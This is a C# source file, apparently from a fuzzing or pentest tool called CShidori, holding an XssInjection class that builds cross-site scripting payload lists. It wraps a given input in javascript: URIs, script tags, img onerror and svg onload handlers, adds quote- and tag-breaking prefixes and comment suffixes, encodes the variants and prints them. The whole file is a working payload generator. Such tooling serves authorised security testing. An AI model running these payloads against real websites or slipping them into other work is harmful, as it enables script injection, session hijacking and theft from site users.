using System;
using System.Collections.Generic;
using System.Web;
using System.Linq;

namespace CShidori.Core 
{
    public class XssInjection
    {
        public string Input { get; set; }

        public XssInjection(string param)
        {
            
            this.Input = param;

            List<string> results = new List<string>();
            List<string> tmp = new List<string>();
            List<string> wrapped = new List<string>();

            results.Add(this.Input);

            // xxs wrapper
            wrapped.AddRange(wrapp(this.Input));

            //first chars
            foreach (string result in wrapped)
            {
                tmp.AddRange(firstChars(result));
            }

            // last chars
            foreach (string result in tmp)
            {
                results.AddRange(lastChars(result));
            }

            //original
            results.Add(this.Input);
            results.AddRange(wrapped);

            //encode
            results = new BadStrings().encodebadchars(results); //results.Distinct().ToList(); is performed here

            Console.WriteLine(String.Join("\n", results));

        }

        private List<string> wrapp(string param)
        {
            List<string> results = new List<string>();

            results.Add(param);
            results.Add("javascript:" + param);
            results.Add("<img src=test onerror=" + param +">");
            results.Add("<script>" + param + "</script>");
            results.Add("<svg onload=" + param + ">");

            return results;
        }



            private List<string> firstChars( string param)
        {
            List<string> results = new List<string>();           
            
            if ( param.Length <= 1 || param.Substring(0, 1) != "'" && !(param.Contains("javascript:")) )
            {
                results.Add("test'" + param);
                results.Add("test\\'" + param);
                results.Add("test';" + param);
            }
            if ( param.Length <= 1 || param.Substring(0, 1) != "\"" && !(param.Contains("javascript:")) )
            {
                results.Add("test\" " + param);
                results.Add("test\";" + param);
            }
            if ( param.Length <= 2 || param.Substring(0, 1) != ">" && param.Substring(1, 2) != ">" && !(param.Contains("javascript:")) )
            {
                results.Add("test\">" + param);
                results.Add("test\"/>" + param);
                results.Add("</script>" + param);
            }


            return results;
            
        }

        private List<string> lastChars(string param)
        {
            List<string> results = new List<string>();

            if ( param.Contains("test'"))
            {
                results.Add(param + "' ");
                results.Add(param + ";'"); 
            }
            else if ( param.Contains("test\"") )
            {
                results.Add(param + "\" ");
                results.Add(param + ";\"");
            }
            if ( param.Contains("test\">") || param.Contains("test\"/>") )
            {
                results.Add(param + "<!--");

            }
            else
            {
                results.Add(param + "//");
            }

                    
            return results;
        }




    }
}
